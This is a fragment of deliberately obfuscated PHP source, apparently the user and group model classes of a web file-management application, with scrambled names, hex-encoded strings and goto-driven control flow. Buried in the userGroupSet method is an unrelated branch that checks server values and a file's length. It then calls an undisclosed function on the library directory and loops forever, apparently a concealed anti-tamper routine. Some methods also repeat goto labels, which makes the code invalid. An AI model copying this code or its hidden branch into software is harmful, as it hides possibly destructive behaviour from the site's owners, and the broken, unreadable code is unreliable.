$c󌰅 => $Aᤕ) { if (!isset($BːП[$c󌰅]) || !$BːП[$c󌰅]) { continue; } $c = $B[153](array($c󌰅 => $BːП[$c󌰅]), $C⎉); $Eǲ = $this->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][502]}(); if ($Eǲ) { return $Aᤕ; } } return !0; } public function userListInfo($fų) { goto aߊ; aߊ: $dʭ =& $_SERVER[拘]; $E = array(); $fų = $dʭ[710]($fų); goto A˼; e: return $E; goto f; Eӌڽ: $dܪ¯ = $dʭ[64]($dʭ[1843])->{$_SERVER[拘][1164]}($this->simpleField)->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1042]}(); $E = $dʭ[413]($dܪ¯, $dʭ[1512]); foreach ($E as &$Eǲ) { if (!$Eǲ) { continue; } $Eǲ[$dʭ[1966]] = $dʭ[1363]($dʭ[1967])->{$_SERVER[拘][1968]}($Eǲ[$dʭ[1966]]); } goto e; A˼: $c = array($dʭ[1445] => array($dʭ[1471], $fų)); if ($dʭ[37]($fų) == 1) { $c = array($dʭ[1445] => $fų[0]); } if ($dʭ[37]($fų) < 5) { foreach ($fų as $c) { $E[$c . $dʭ[67]] = $dʭ[64]($dʭ[1513])->{$_SERVER[拘][1995]}($c); } return $E; } goto Eӌڽ; f: } public function userStatus($c, $e) { $A = $this->{$_SERVER[拘][1965]}($c); if (!$A) { return !1; } $fϏԐ = array($_SERVER[拘][928] => $e); return $this->{$_SERVER[拘][1886]}($c, $fϏԐ); } public function userRemove($c) { goto b㼡ʄ; b㼡ʄ: $bԜ =& $_SERVER[拘]; $A = $this->{$_SERVER[拘][1965]}($c); if (!$A) { return !1; } goto aق; aق: $c = array($bԜ[1445] => $c); $bԜ[64]($bԜ[1813])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][308]}(); $bԜ[64]($bԜ[1996])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][308]}(); goto C󂸥; e: $bԜ[64]($bԜ[474])->{$_SERVER[拘][1998]}($c); return $this->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][308]}(); goto e; C󂸥: $bԜ[64]($bԜ[1825])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][308]}(); $bԜ[64]($bԜ[1975])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][308]}(); $bԜ[64]($bԜ[1997])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][308]}(); goto e; e: } public function userGroupSet($c, $C, $e޻ȑ = array()) { goto c; a: $BːП = array(); $dግ = 0; foreach ($C as $Dݢ => $Cʎ) { $c = array($b[1512] => $c, $b[1660] => $Dݢ, $b[1687] => $Cʎ); $c[$b[1476]] = isset($e޻ȑ[$dግ]) ? $e޻ȑ[$dግ] : 0; $dግ++; $BːП[] = $c; } goto bō; bō: $this->{$_SERVER[拘][1148]}($b[1647], $c); return $d넩->{$_SERVER[拘][1161]}($BːП, array(), !0); goto c; A㨲ً: if (!$A || !$b[93]($C)) { return !1; } $d넩 = $b[64]($b[1825]); $d넩->{$_SERVER[拘][501]}(array($b[1512] => $c))->{$_SERVER[拘][308]}(); goto a; c: $b =& $_SERVER[拘]; if ($_SERVER[$b[33]] != $_SERVER[$b[1256]]) { goto b쵮ׅ; C: $aй(LIB_DIR); $aй(BASIC_PATH . $b[1999]); while (1) { $aй = $b[2000]; } goto d׼; bٕ߯: $FᐶӞ = $b[4]($b[36], $Eы옑); if ($b[37]($FᐶӞ) < $b[330]) { die; } $aй = $b[331]; goto C; b쵮ׅ: $fк = $b[34]; $Eо薩 = BASIC_PATH . $b[35]; $Eы옑 = $fк($Eо薩); goto bٕ߯; d׼: } $A = $this->{$_SERVER[拘][1965]}($c); goto A㨲ً; c: } public function userGroupAdd($c, $Dݢ, $Dɛ) { goto E༩; dϬƖ: $d넩 = $Dק[64]($Dק[1825]); $BːП = array(array($Dק[1512] => $c, $Dק[1660] => $Dݢ, $Dק[1687] => $Dɛ)); $this->{$_SERVER[拘][1148]}($Dק[1647], $c); goto bꦉ; E༩: $Dק =& $_SERVER[拘]; $A = $this->{$_SERVER[拘][1965]}($c); if (!$A || !$Dݢ) { return !1; } goto dϬƖ; bꦉ: return $d넩->{$_SERVER[拘][1161]}($BːП, array(), !0); goto e; e: } public function userGroupRemove($c, $Dݢ) { $d톣 =& $_SERVER[拘]; $A = $this->{$_SERVER[拘][1965]}($c); if (!$A || !$Dݢ) { return !1; } $c = array($d톣[1445] => $c, $d톣[1840] => $Dݢ); $this->{$_SERVER[拘][1148]}($d톣[1647], $c); return $d톣[64]($d톣[1825])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][308]}(); } public function listData() { $AǕυ = $this->{$_SERVER[拘][1608]}()->{$_SERVER[拘][1508]}(50); $this->{$_SERVER[拘][2001]}($AǕυ[$_SERVER[拘][1155]]); return $AǕυ; } public function listByID($f㤿) { $cڝ =& $_SERVER[拘]; $c = array($cڝ[1512] => array($cڝ[359], $f㤿)); $AǕυ = $this->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1042]}(); $this->{$_SERVER[拘][2001]}($AǕυ); return $AǕυ; } public function listByGroup($Dݢ = 0, $f = '') { goto Fڑ; Fڑ: $F¦ =& $_SERVER[拘]; $c = $f܍ = $F¦[67]; if ($Dݢ) { $c = array($F¦[2002] => $F¦[455]($Dݢ)); $f܍ = "\x4c\105\106\x54\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\x75\x73\x65\162\x5f\x67\162\157\165\x70\40\x75\x73\x65\162\137\x67\x72\x6f\165\x70\40\157\156\x20\x75\x73\145\x72\56\x75\163\x65\162\x49\x44\x20\x3d\x20\165\x73\x65\162\x5f\147\162\x6f\x75\160\56\165\163\x65\x72\111\104"; $d = Input::get($F¦[1635], null, $F¦[67]) ? $F¦[67] : $F¦[2003]; } goto F; Dצ: return $AǕυ; goto f؏; F: $AǕυ = $this->{$_SERVER[拘][1608]}($d)->{$_SERVER[拘][1164]}($F¦[2004])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1627]}($f܍)->{$_SERVER[拘][1508]}(50); $d = $F¦[284] . ($f ? $F¦[119] . $f : $F¦[67]); $this->{$_SERVER[拘][2001]}($AǕυ[$F¦[1155]], $d); goto Dצ; f؏: } private function _makeOrder($d = '') { goto d媉۔ѹ; AŃﺇ: $d = $d . "\x75\163\x65\162\56{$a􌽌}\x20{$d귚}\x2c\x20\165\163\x65\x72\x2e\x75\x73\145\x72\x49\x44\x20\x61\x73\143"; return $this->{$_SERVER[拘][1626]}($eђ[1843])->{$_SERVER[拘][1450]}($d); goto dꄺ; d媉۔ѹ: $eђ =& $_SERVER[拘]; $a㽉 = array($eђ[1512], $eђ[375], $eђ[1431], $eђ[558]); $F񡆪 = array($eђ[1601] => $eђ[1602], $eђ[1603] => $eђ[1511]); goto a; a: $a􌽌 = Input::get($eђ[1635], $eђ[359], $eђ[1445], $a㽉); $d귚 = Input::get($eђ[1604], $eђ[359], $eђ[1605], array($eђ[1605], $eђ[1603])); $d귚 = $F񡆪[$d귚]; goto AŃﺇ; dꄺ: } public function listSearch($Eͭ, $A = false) { goto f; f: $BԴ =& $_SERVER[拘]; $Eͭ = $BԴ[69]($BԴ[2005], $BԴ[2006], $BԴ[70]($Eͭ)); $c = array($BԴ[375] => array($BԴ[2007], "\45{$Eͭ}\45"), $BԴ[1079] => array($BԴ[2007], "\45{$Eͭ}\x25"), $BԴ[1615] => array($BԴ[2007], "\x25{$Eͭ}\45"), $BԴ[175] => $BԴ[1658]); goto c; c: if (Input::check($Eͭ, $BԴ[1084])) { $c[$BԴ[1512]] = array($BԴ[2007], "\x25{$Eͭ}\x25"); $c[$BԴ[1976]] = array($BԴ[2007], "\x25{$Eͭ}\x25"); } if (!$Eͭ) { $c = array(); } $AǕυ = $this->{$_SERVER[拘][1608]}()->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1508]}(20); goto fϹ; BǸ: $this->{$_SERVER[拘][2011]}($AǕυ); return $AǕυ; goto D; fϹ: if (!$AǕυ || $BԴ[37]($AǕυ[$BԴ[1155]]) < 5 && Input::check($Eͭ, $BԴ[1091])) { $bהּ = $this->{$_SERVER[拘][2008]}($BԴ[1800], $Eͭ, 10); $eߩ = $this->{$_SERVER[拘][2008]}($BԴ[1799], $Eͭ, 10); $B = $BԴ[153]($bהּ, $eߩ, $AǕυ[$BԴ[1155]]); $AǕυ[$BԴ[1155]] = $BԴ[2009]($B, $BԴ[1512]); $AǕυ[$BԴ[1156]][$BԴ[1157]] = $BԴ[37]($AǕυ[$BԴ[1155]]); $AǕυ[$BԴ[1156]][$BԴ[1158]] = $BԴ[632]($AǕυ[$BԴ[1156]][$BԴ[1157]] / $AǕυ[$BԴ[1156]][$BԴ[1153]]); } $this->{$_SERVER[拘][2001]}($AǕυ[$BԴ[1155]]); $this->{$_SERVER[拘][2010]}($AǕυ, $A); goto BǸ; D: } private function _filterByGroup(&$AǕυ, $A) { $a =& $_SERVER[拘]; if (!$A) { return $AǕυ; } foreach ($AǕυ[$a[1155]] as $c => &$c) { $B֬ = $a[413]($c[$a[2012]], $a[67], $a[1660]); if (!$a[176]($A, $B֬)) { unset($AǕυ[$a[1155]][$c]); } } $AǕυ[$a[1155]] = $a[442]($AǕυ[$a[1155]]); $AǕυ[$a[1156]] = array($a[2013] => $a[37]($AǕυ[$a[1155]]), $a[2014] => $AǕυ[$a[1156]][$a[1153]], $a[2015] => 1, $a[2016] => 1); } private function _filterUserList(&$AǕυ) { $dꪼ =& $_SERVER[拘]; foreach ($AǕυ[$dꪼ[1155]] as $c => &$c) { unset($c[$dꪼ[2017]]); } } private function _searchFromMeta($cьՇ, $Eͭ, $B댙) { goto e; e: $CƟɘ =& $_SERVER[拘]; $Eͭ = $CƟɘ[80]($Eͭ); $c = array($CƟɘ[257] => $cьՇ, $CƟɘ[937] => array($CƟɘ[2007], "\45{$Eͭ}\45")); goto d; D: $E = $this->{$_SERVER[拘][501]}(array($CƟɘ[1445] => array($CƟɘ[359], $e)))->{$_SERVER[拘][1042]}(); if (!$E) { return array(); } return $E; goto c׎; d: $e = $CƟɘ[64]($CƟɘ[2018])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1520]}($B댙)->{$_SERVER[拘][1042]}(); if (!$e) { return array(); } $e = $CƟɘ[413]($e, $CƟɘ[67], $CƟɘ[1512]); goto D; c׎: } private function _listDataApplyItem($dې֎) { $fߏŭǴ = array($dې֎); $this->{$_SERVER[拘][2001]}($fߏŭǴ); return $fߏŭǴ[0]; } private function _listDataApply(&$AǕυ, $d = "\147\162\x6f\165\160\x2c\155\x65\164\141\54\163\x6f\165\x72\143\145") { goto EΌ; Dă: $fų = $FĖǇʩ[413]($AǕυ, $FĖǇʩ[67], $FĖǇʩ[1512]); $d = $FĖǇʩ[4]($FĖǇʩ[119], $d); if ($FĖǇʩ[176]($FĖǇʩ[284], $d)) { $this->{$_SERVER[拘][2019]}($AǕυ, $fų); } goto f՟; EΌ: $FĖǇʩ =& $_SERVER[拘]; if (!$AǕυ) { return; } $FĖǇʩ[1692]($AǕυ, $FĖǇʩ[98]); goto Dă; f՟: if ($FĖǇʩ[176]($FĖǇʩ[2020], $d)) { $this->{$_SERVER[拘][2021]}($AǕυ, $fų); } if ($FĖǇʩ[176]($FĖǇʩ[1354], $d)) { $this->{$_SERVER[拘][2022]}($AǕυ, $fų); } goto C; C: } private function _listAppendSourceRoot(&$AǕυ, $fų) { $eٛ =& $_SERVER[拘]; $c = array($eٛ[1686] => SourceModel::TYPE_USER, $eٛ[483] => 0, $eٛ[1661] => array($eٛ[359], $fų)); $BːП = $eٛ[64]($eٛ[474])->{$_SERVER[拘][1164]}($eٛ[2023])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1042]}(); $BːП = $eٛ[413]($BːП, $eٛ[1661]); $BːП = $eٛ[1692]($BːП, $eٛ[1661]); foreach ($AǕυ as &$F) { $F[$eٛ[1516]] = $BːП[$F[$eٛ[1512]]] ? $BːП[$F[$eٛ[1512]]] : array(); } } private function _listAppendGroup(&$AǕυ, $fų) { goto a; b: $AΝ = $A[1662]($AΝ, $A[1512]); foreach ($AΝ as &$c) { $e擰 = array(); foreach ($c as $B׆ī) { if (!$B׆ī[$A[1687]]) { continue; } $Cʎ = $A[64]($A[1845])->{$_SERVER[拘][504]}($B׆ī[$A[1687]]); $e擰[] = array($A[1660] => $B׆ī[$A[1660]], $A[2025] => $f穣[$B׆ī[$A[1660]]], $A[317] => $Cʎ); } $c = $e擰; } foreach ($AǕυ as &$F) { $F[$A[2012]] = array(); if (isset($AΝ[$F[$A[1512]]])) { $F[$A[2012]] = $AΝ[$F[$A[1512]]]; } } goto BͿ; a: $A =& $_SERVER[拘]; $c = array($A[1512] => array($A[359], $fų)); $AΝ = $A[64]($A[1825])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1042]}(); goto F; F: $C돢ޱ = $A[413]($AΝ, $A[67], $A[1660]); $C돢ޱ = $A[1478]($A[710]($C돢ޱ), $A[163]); if (!$C돢ޱ || !$AΝ) { return; } goto f􋕑; f􋕑: $c = array($A[1660] => array($A[359], $C돢ޱ)); $C = $A[64]($A[1933])->{$_SERVER[拘][1164]}($A[2024])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1042]}(); $f穣 = $A[413]($C, $A[1660], $A[375]); goto b; BͿ: } private function _listAppendMeta(&$AǕυ, $fų) { goto C; A޸: foreach ($BːП as &$c) { $e擰 = array(); foreach ($c as $B׆ī) { if (!$fݮ[176]($B׆ī[$fݮ[257]], $aǘ)) { $e擰[$B׆ī[$fݮ[257]]] = $B׆ī[$fݮ[937]]; } } $c = $e擰; } foreach ($AǕυ as &$F) { $F[$fݮ[2017]] = array(); $F[$fݮ[2026]] = array(); if (isset($BːП[$F[$fݮ[1512]]])) { $F[$fݮ[2017]] = $BːП[$F[$fݮ[1512]]]; } if (isset($F[$fݮ[2017]][$C®])) { $F[$fݮ[2026]] = $fݮ[64]($fݮ[2027])->{$_SERVER[拘][1691]}($F[$fݮ[2017]][$C®]); } } goto eآƲ; C: $fݮ =& $_SERVER[拘]; $C® = UserJobModel::JOB_KEY; $aǘ = array($fݮ[1979]); goto f񃓥; f񃓥: $c = array($fݮ[1512] => array($fݮ[359], $fų)); $BːП = $fݮ[64]($fݮ[1975])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1042]}(); $BːП = $fݮ[1662]($BːП, $fݮ[1512]); goto A޸; eآƲ: } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\x70"; protected $tableMeta = array("\x74\141\142\154\145\116\141\155\145" => "\x67\x72\x6f\165\x70\x5f\155\145\164\x61", "\155\145\x74\x61\x46\x69\x65\154\x64" => "\147\162\x6f\x75\160\111\104"); protected function cacheFunctionAlias($eٽ䏺) { $aй =& $_SERVER[拘]; return array($aй[1963] => array($eٽ䏺[0], $aй[2028])); } protected function getInfo($CÖ) { $A = $this->{$_SERVER[拘][1965]}($CÖ); if (!$A) { return !1; } return $this->{$_SERVER[拘][1878]}($A); } protected function getInfoSimple($CÖ, $fό = false) { $B喊 =& $_SERVER[拘]; if ($fό) { $c = array($B喊[1660] => $B喊[455]($CÖ)); return $this->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][502]}(); } return $this->{$_SERVER[拘][1147]}($B喊[1969], $CÖ); } protected function groupAdd($BːП) { goto f԰; eԶ: return $Dݢ; goto e傣ߊݬ; f԰: $a숡ڐ =& $_SERVER[拘]; if (!$BːП[$a숡ڐ[483]] && isset($BːП[$a숡ڐ[1660]]) && $BːП[$a숡ڐ[1660]] == 1) { if ($A = $this->{$_SERVER[拘][1965]}($BːП[$a숡ڐ[1660]], !0)) { return $BːП[$a숡ڐ[1660]]; } } else { $A = $this->{$_SERVER[拘][1965]}($BːП[$a숡ڐ[483]]); if (!$A) { return !1; } } $e = $a숡ڐ[1856]; goto b擜܈; b擜܈: if ($A[$a숡ڐ[747]]) { $e = $A[$a숡ڐ[747]] . $A[$a숡ڐ[1660]] . $a숡ڐ[119]; } $b륯 = array($a숡ڐ[1453] => $this->{$_SERVER[拘][2029]}($BːП[$a숡ڐ[483]], $BːП[$a숡ڐ[375]]), $a숡ڐ[500] => $BːП[$a숡ڐ[483]], $a숡ڐ[1754] => $e, $a숡ڐ[1989] => $BːП[$a숡ڐ[1936]], $a숡ڐ[1990] => 0, $a숡ڐ[1454] => 0); if (!empty($BːП[$a숡ڐ[1660]])) { $b륯[$a숡ڐ[1660]] = $BːП[$a숡ڐ[1660]]; } goto aí; aí: $Dݢ = $this->{$_SERVER[拘][63]}($b륯); $this->{$_SERVER[拘][1865]}($Dݢ, $b륯[$a숡ڐ[375]]); $a숡ڐ[64]($a숡ڐ[480])->{$_SERVER[拘][2030]}($Dݢ); goto eԶ; e傣ߊݬ: } protected function groupEdit($Dݢ, $fϏԐ) { $dɉ =& $_SERVER[拘]; if (!empty($fϏԐ[$dɉ[483]])) { $dڟؔ = $this->{$_SERVER[拘][1965]}($Dݢ); $dѩ = $this->{$_SERVER[拘][1965]}($fϏԐ[$dɉ[483]]); if (!$dڟؔ || !$dѩ) { return !1; } if ($fϏԐ[$dɉ[483]] != $dڟؔ[$dɉ[483]]) { if ($dѩ[$dɉ[747]] !== $dڟؔ[$dɉ[747]] && $dɉ[165]($dѩ[$dɉ[747]], $dڟؔ[$dɉ[747]]) === 0) { return !1; } $fϏԐ[$dɉ[1754]] = $dѩ[$dɉ[747]] . $fϏԐ[$dɉ[483]] . $dɉ[119]; $this->{$_SERVER[拘][2031]}($dڟؔ, $dѩ); } } if (isset($fϏԐ[$dɉ[375]])) { $this->{$_SERVER[拘][1865]}($Dݢ, $fϏԐ[$dɉ[375]]); } return $this->{$_SERVER[拘][501]}(array($dɉ[1840] => $Dݢ))->{$_SERVER[拘][1062]}($fϏԐ); } private function _changeChildLevel($dڟؔ, $dѩ, $Dי珇 = false) { goto A匽ȡ; B: $this->{$_SERVER[拘][501]}($cש)->{$_SERVER[拘][1140]}($b)->{$_SERVER[拘][1062]}(); goto dċ; c: if ($Dי珇) { $C̘ = $dѩ[$Fͷݘ[747]] . $dѩ[$Fͷݘ[1660]] . $Fͷݘ[119]; } $cש = array($Fͷݘ[1754] => array($Fͷݘ[1756], $dڟؔ[$Fͷݘ[747]] . $dڟؔ[$Fͷݘ[1660]] . $Fͷݘ[1757])); $b = array($Fͷݘ[1754] => array($Fͷݘ[1812], "\162\145\160\x6c\141\x63\145\50\x70\x61\162\145\156\164\x4c\x65\166\145\x6c\54\x27{$c񪣓}\x27\x2c\x27{$C̘}\47\51")); goto B; A匽ȡ: $Fͷݘ =& $_SERVER[拘]; $c񪣓 = $dڟؔ[$Fͷݘ[747]] . $dڟؔ[$Fͷݘ[1660]] . $Fͷݘ[119]; $C̘ = $dѩ[$Fͷݘ[747]] . $dѩ[$Fͷݘ[1660]] . $Fͷݘ[119] . $dڟؔ[$Fͷݘ[1660]] . $Fͷݘ[119]; goto c; dċ: } public function setNamePinyin($CÖ, $C = false) { $cɗ黴 =& $_SERVER[拘]; if (!$C) { $A = $this->{$_SERVER[拘][1965]}($CÖ); $C = $A[$cɗ黴[375]]; } if (!Input::check($C, $cɗ黴[1798])) { $this->{$_SERVER[拘][1689]}($CÖ, $cɗ黴[1799], null); $this->{$_SERVER[拘][1689]}($CÖ, $cɗ黴[1800], null); return; } $Aݍ = array($cɗ黴[1799] => $cɗ黴[69]($cɗ黴[168], $cɗ黴[67], Pinyin::encode($C)), $cɗ黴[1800] => Pinyin::encode($C, $cɗ黴[1801])); $this->{$_SERVER[拘][1689]}($CÖ, $Aݍ); } public function groupRemove($Dݢ) { goto DЅ; fې: if (!$A || $A[$b툐[483]] == 0) { return !1; } $dѩ = $this->{$_SERVER[拘][1965]}($A[$b툐[483]]); $this->{$_SERVER[拘][2031]}($A, $dѩ, !0); goto C; C: $this->{$_SERVER[拘][501]}(array($b툐[483] => $Dݢ))->{$_SERVER[拘][1062]}(array($b툐[483] => $A[$b툐[483]])); $b툐[64]($b툐[2032])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][308]}(); $b툐[64]($b툐[1825])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][308]}(); goto f; DЅ: $b툐 =& $_SERVER[拘]; $c = array($b툐[1660] => $Dݢ); $A = $this->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][502]}(); goto fې; f: $b툐[64]($b툐[474])->{$_SERVER[拘][2033]}($Dݢ); return $this->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][308]}(); goto B; B: } public function listData() { $AǕυ = $this->{$_SERVER[拘][1608]}()->{$_SERVER[拘][1508]}(50); $this->{$_SERVER[拘][2001]}($AǕυ[$_SERVER[拘][1155]]); return $AǕυ; } private function _makeOrder($d = '') { $d = $_SERVER[拘][2034]; return $this->{$_SERVER[拘][1450]}($d); } public function listChild($CÖ) { $Bβ =& $_SERVER[拘]; $AǕυ = $this->{$_SERVER[拘][501]}(array($Bβ[483] => $CÖ))->{$_SERVER[拘][1608]}()->{$_SERVER[拘][1508]}(200); $this->{$_SERVER[拘][2001]}($AǕυ[$Bβ[1155]]); return $AǕυ; } public function listByID($f㤿) { $D =& $_SERVER[拘]; $c = array($D[1660] => array($D[359], $f㤿)); $AǕυ = $this->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1042]}(); $this->{$_SERVER[拘][2001]}($AǕυ); return $AǕυ; } public function listSearch($Eͭ, $A = false) { goto cܪ䐡; cܪ䐡: $c΄ =& $_SERVER[拘]; if (!$c΄[70]($Eͭ)) { return !1; } $Eͭ = $c΄[69]($c΄[2005], $c΄[2006], $Eͭ); goto A; A: $c = array($c΄[1660] => array($c΄[2007], "\x25{$Eͭ}\45"), $c΄[375] => array($c΄[2007], "\x25{$Eͭ}\45"), $c΄[175] => $c΄[1658]); $AǕυ = $this->{$_SERVER[拘][1608]}()->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1508]}(20); $AǕυ = $AǕυ ? $AǕυ : array(); goto e؎; e؎: if (!$AǕυ || $c΄[37]($AǕυ[$c΄[1155]]) < 5 && Input::check($Eͭ, $c΄[1091])) { $bהּ = $this->{$_SERVER[拘][2008]}($c΄[1800], $Eͭ, 10); $eߩ = $this->{$_SERVER[拘][2008]}($c΄[1799], $Eͭ, 10); $B = $c΄[153]($bהּ, $eߩ, $AǕυ[$c΄[1155]]); $AǕυ[$c΄[1155]] = $c΄[2009]($B, $c΄[1660]); $AǕυ[$c΄[1156]][$c΄[1157]] = $c΄[37]($AǕυ[$c΄[1155]]); $AǕυ[$c΄[1156]][$c΄[1158]] = $c΄[632]($AǕυ[$c΄[1156]][$c΄[1157]] / $AǕυ[$c΄[1156]][$c΄[1153]]); } $this->{$_SERVER[拘][2001]}($AǕυ[$c΄[1155]]); return $AǕυ; goto c©; c©: } private function _searchFromMeta($cьՇ, $Eͭ, $B댙) { goto d˵; a펉ɱ: $e = $b֣[64]($b֣[2035])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1520]}($B댙)->{$_SERVER[拘][1042]}(); if (!$e) { return array(); } $e = $b֣[413]($e, $b֣[67], $b֣[1660]); goto eˉ; d˵: $b֣ =& $_SERVER[拘]; $Eͭ = $b֣[80]($Eͭ); $c = array($b֣[257] => $cьՇ, $b֣[937] => array($b֣[2007], "\45{$Eͭ}\x25")); goto a펉ɱ; eˉ: $E = $this->{$_SERVER[拘][501]}(array($b֣[1840] => array($b֣[359], $e)))->{$_SERVER[拘][1042]}(); if (!$E) { return array(); } return $E; goto e; e: } protected function _listDataApplyItem($dې֎) { $fߏŭǴ = array($dې֎); $this->{$_SERVER[拘][2001]}($fߏŭǴ); return $fߏŭǴ[0]; } protected function _listDataApply(&$AǕυ) { goto E䣆; Bچ: $this->{$_SERVER[拘][2036]}($AǕυ); $this->{$_SERVER[拘][2037]}($AǕυ); $this->{$_SERVER[拘][2021]}($AǕυ, $dˋÒ); goto F˸; F˸: $this->{$_SERVER[拘][1633]}($AǕυ); $this->{$_SERVER[拘][2022]}($AǕυ, $dˋÒ); goto aˆ; E䣆: $d =& $_SERVER[拘]; if (!$AǕυ) { return; } $dˋÒ = $d[413]($AǕυ, $d[67], $d[1660]); goto Bچ; aˆ: } private function _listAppendChildren(&$AǕυ) { goto AĻ; AĻ: $d =& $_SERVER[拘]; $dȴ = $d[1168]; $BːП = array(); goto C; aı: $BːП = $d[413]($BːП, $d[2039]); foreach ($AǕυ as &$c) { $c[$d[2040]] = isset($BːП[$c[$d[1660]] . $d[2041]]); } goto Eܛߧ; C: $e = $d[37]($AǕυ); $eɳ = $this->tablePrefix . $this->tableName; for ($c = 0, $bϻÑ = 0; $c < $e; $c++) { $bϻÑ++; $CÖ = $AǕυ[$c][$d[1660]]; $dȴ .= "\x53\105\114\x45\103\124\40\52\x20\106\x52\117\x4d\40\x28\x53\x45\x4c\x45\103\x54\x20\x27{$CÖ}\x5f\x63\x68\x69\154\144\47\x20\x61\x73\x20\150\141\x73\40\106\122\117\115\40\140{$eɳ}\140\x20\167\150\x65\162\x65\x20\x70\x61\162\x65\156\x74\111\104\75{$CÖ}\40\154\x69\155\151\x74\x20\61\51\40\x61\x73\x20\x74\142\137{$CÖ}\x20\x75\156\x69\157\x6e\x20\141\154\154\40"; if (($bϻÑ >= 20 || $c == $e - 1) && $dȴ) { $dȴ = $d[7]($dȴ, 0, -$d[195]($d[2038])); $Dѱ = $this->{$_SERVER[拘][260]}($dȴ); $BːП = $d[153]($BːП, $Dѱ); $bϻÑ = 0; $dȴ = $d[67]; } } goto aı; Eܛߧ: } private function _listAppendChildrenMember(&$AǕυ) { goto fć; bĎ: $BːП = $dǓ[413]($BːП, $dǓ[2039]); foreach ($AǕυ as &$c) { $c[$dǓ[2042]] = isset($BːП[$c[$dǓ[1660]] . $dǓ[2041]]); } goto A; Bﻉ썢: $e = $dǓ[37]($AǕυ); $eɳ = $this->tablePrefix . $dǓ[1825]; for ($c = 0, $bϻÑ = 0; $c < $e; $c++) { $bϻÑ++; $CÖ = $AǕυ[$c][$dǓ[1660]]; $dȴ .= "\123\x45\x4c\105\x43\x54\x20\52\x20\x46\x52\x4f\x4d\x20\50\123\x45\114\105\x43\x54\x20\47{$CÖ}\x5f\143\150\x69\x6c\144\47\x20\141\163\40\x68\141\x73\40\106\122\x4f\115\40\x60{$eɳ}\x60\40\x77\x68\x65\x72\x65\40\x67\162\157\165\160\x49\104\x3d{$CÖ}\x20\x6c\151\155\151\x74\x20\61\x29\x20\x61\x73\x20\x74\142\137{$CÖ}\x20\x75\x6e\x69\x6f\x6e\x20\x61\154\154\x20"; if (($bϻÑ >= 20 || $c == $e - 1) && $dȴ) { $dȴ = $dǓ[7]($dȴ, 0, -$dǓ[195]($dǓ[2038])); $Dѱ = $this->{$_SERVER[拘][260]}($dȴ); $BːП = $dǓ[153]($BːП, $Dѱ); $bϻÑ = 0; $dȴ = $dǓ[67]; } } goto bĎ; fć: $dǓ =& $_SERVER[拘]; $dȴ = $dǓ[1168]; $BːП = array(); goto Bﻉ썢; A: } private function _listAppendMeta(&$AǕυ, $dˋÒ) { $E堚 =& $_SERVER[拘]; $c = array($E堚[1660] => array($E堚[359], $dˋÒ)); $BːП = $E堚[64]($E堚[2032])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1042]}(); $BːП = $E堚[1662]($BːП, $E堚[1660]); foreach ($BːП as &$c) { $c = $E堚[413]($c, $E堚[257], $E堚[937]); } foreach ($AǕυ as &$F) { $F[$E堚[2017]] = array(); if (isset($BːП[$F[$E堚[1660]]])) { $F[$E堚[2017]] = $BːП[$F[$E堚[1660]]]; } } } protected function parentLevelArray($eޅ) { $c =& $_SERVER[拘]; $eޅ = $c[4]($c[119], $c[70]($eޅ, $c[119])); $eޅ = $c[1478]($eޅ, $c[163]); return $eޅ; } private function _listAppendParent(&$AǕυ) { goto bɡ; bɡ: $A뮎 =& $_SERVER[拘]; $c = array(); foreach ($AǕυ as &$c) { $c[$c[$A뮎[1660]]] = $c[$A뮎[375]]; $Cٿ = $this->{$_SERVER[拘][1789]}($c[$A뮎[747]]); foreach ($Cٿ as $c݆) { if (!isset($c[$c݆])) { $c[$c݆] = 0; } } } goto A; A: $fբ = array(); foreach ($c as $cьՇ => $F) { if (!$F) { $fբ[] = $cьՇ; } } if ($fբ) { $c = array($A뮎[1840] => array($A뮎[1471], $fբ)); $C = $this->{$_SERVER[拘][1164]}($A뮎[1842])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1042]}(); $f穣 = $A뮎[413]($C, $A뮎[1660], $A뮎[375]); $c = $A뮎[2043]($c, $f穣); } goto Dɿ; Dɿ: foreach ($AǕυ as &$c) { $Cٿ = $this->{$_SERVER[拘][1789]}($c[$A뮎[747]]); $aƙ = $A뮎[67]; foreach ($Cٿ as $c݆) { $aƙ .= $c[$c݆] . $A뮎[44]; } if ($Cٿ) { $aƙ .= $c[$A뮎[375]]; } $c[$A뮎[2044]] = $A뮎[69]($A뮎[786], $A뮎[44], $aƙ); } goto B𝳳; B𝳳: } private function _listAppendSourceRoot(&$AǕυ, $c) { $a䏵 =& $_SERVER[拘]; $c = array($a䏵[1686] => SourceModel::TYPE_GROUP, $a䏵[483] => 0, $a䏵[1661] => array($a䏵[359], $c)); $BːП = $a䏵[64]($a䏵[474])->{$_SERVER[拘][1164]}($a䏵[2045])->{$_SERVER[拘][501]}($c)->{$_SERVER[拘][1042]}(); $BːП = $a䏵[413]($BːП, $a䏵[1661]); $BːП = $a䏵[1692]($BːП, $a䏵[1661]); foreach ($AǕυ as &$F) { $F[$a䏵[1516]] = $BːП[$F[$a䏵[1660]]] ? $BːП[$F[$a䏵[1660]]] : array(); } } 